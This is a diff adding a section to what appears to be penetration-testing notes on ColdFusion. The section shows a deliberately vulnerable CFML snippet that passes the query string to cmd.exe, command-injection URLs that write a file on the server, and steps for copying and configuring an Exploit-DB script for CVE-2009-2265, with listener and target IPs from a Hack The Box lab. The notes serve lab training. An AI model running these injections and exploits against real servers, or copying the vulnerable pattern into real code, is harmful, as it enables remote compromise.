@@ -109,3 +109,33 @@ password.properties: configuration file in ColdFusion that stores encypted passw
 {% embed url="https://www.rapid7.com/db/modules/auxiliary/gather/coldfusion_pwd_props/" %}
 
 #### Un-Authenticated RCE&#x20;
+
+Can be introduced by poor coding of the CF web application like so:
+
+```html
+<cfset cmd = "#cgi.query_string#">
+<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
+
+http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
+
+http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
+```
+
+#### CVE-2009-2265  Adobe ColdFusion 8 - Remote Command Execution (RCE)
+
+```shell-session
+searchsploit -p 50057
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+
+#set target info 
+if __name__ == '__main__':
+    # Define some information
+    lhost = '10.10.14.55' # HTB VPN IP
+    lport = 4444 # A port not in use on localhost
+    rhost = "10.129.247.30" # Target IP
+    rport = 8500 # Target Port
+    filename = uuid.uuid4().hex
+
+python3 50057.py 
+```
+
